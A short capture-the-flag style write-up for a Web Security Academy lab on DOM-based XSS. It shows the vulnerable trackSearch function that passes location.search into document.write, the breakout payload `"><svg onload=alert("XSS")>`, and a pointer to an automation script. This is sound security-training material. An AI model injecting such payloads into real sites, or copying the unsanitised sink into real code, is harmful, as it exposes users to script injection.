# XSS LAB 03 -  DOM XSS in document.write sink using source location.search

## Manual Solution

### 1. Access the Lab
- Access the Web Security Academy lab.

### 2. Perform a new search
- Search query: `test`
- Press F12 or right click -> Inspect
- Notice the `trackSearch` function. This function getting the query from the URL and passing it to the `document.write` function.
```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```
- Notice that the query is placed in the img tag. `<img src="/resources/images/tracker.gif?searchTerms=test">`

### 3. Perform a new search
- Query: `"><svg onload=alert("XSS")>` 
- This breaks the HTML structure and adds a svg tag. 
- `<img src="/resources/images/tracker.gif?searchTerms="> <svg onload=alert("XSS")>`
- An alert will be triggered.



## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python xss_lab_03.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)





